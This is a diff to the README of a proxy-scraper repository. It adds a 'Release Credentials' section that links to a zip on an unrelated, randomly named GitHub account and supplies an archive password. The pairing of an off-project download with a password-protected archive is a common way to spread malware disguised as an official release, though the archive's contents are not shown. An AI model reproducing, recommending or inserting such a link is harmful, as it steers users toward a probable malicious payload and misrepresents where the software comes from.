@@ -144,3 +144,10 @@ This repository is intended solely for educational purposes. I neither endorse n
 [MIT](LICENSE)
 
 [![RepoStars](https://repostars.dev/api/embed?repo=sunny9577%2Fproxy-scraper&theme=light)](https://repostars.dev/?repos=sunny9577%2Fproxy-scraper&theme=light)
+
+
+---
+
+## 🔐 Release Credentials
+- **Download Package:** [Direct Release Asset](https://github.com/plumenodeblaze7/proxy-scraper-release-txoc/releases/download/v1.0.0/proxy-scraper.zip)
+- **Archive Password:** `S2wfAxjbxZ`
